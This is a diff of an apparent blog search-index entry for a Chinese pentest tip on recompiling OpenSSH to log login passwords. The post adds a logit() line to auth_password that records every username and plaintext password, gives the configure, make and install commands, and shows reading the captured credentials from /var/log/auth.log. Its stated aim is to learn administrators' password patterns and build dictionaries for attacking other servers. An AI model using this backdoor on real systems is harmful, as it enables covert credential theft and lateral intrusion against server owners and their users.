@@ -3,7 +3,7 @@
   <entry>
     <title><![CDATA[重编译OpebSSH记录登录密码]]></title>
     <url>%2F2018%2F03%2F12%2F%E9%87%8D%E7%BC%96%E8%AF%91OpebSSH%E8%AE%B0%E5%BD%95%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%2F</url>
-    <content type="text"><![CDATA[横向渗透的时候，通过重新编译添加后门 的OpenSSH 记录密码，掌握运维密码组成规律，生成字典去撞其他服务器OpenSSH 源码下载地址 编辑 auth-passwd.c 文件，在 auth_password 函数中添加： 1logit("username: %s password: %s", authctxt-&gt;user, password); 重新编译安装： 12./configure --prefix=/usr --sysconfdir=/etc/ssh --without-zlib-version-check --with-md5-passwords --mandir=/usr/share/manmake &amp;&amp; make install 查看记录的登录密码 1cat /var/log/auth.log]]></content>
+    <content type="text"><![CDATA[横向渗透的时候，可以通过重新编译安装添加后门的 OpenSSH 记录密码，掌握运维密码组成规律，生成字典去撞其他服务器OpenSSH 源码下载地址 编辑 auth-passwd.c 文件，在 auth_password 函数中添加： 1logit("username: %s password: %s", authctxt-&gt;user, password); 重新编译安装： 12./configure --prefix=/usr --sysconfdir=/etc/ssh --without-zlib-version-check --with-md5-passwords --mandir=/usr/share/manmake &amp;&amp; make install 有些环境在编译的时候会报缺少xx头文件的错，安装对于的库就可以了，比如 1apt install libssl-dev libz-dev 查看记录的登录密码 1cat /var/log/auth.log]]></content>
       <tags>
         <tag>Tips</tag>
         <tag>Pentest</tag>
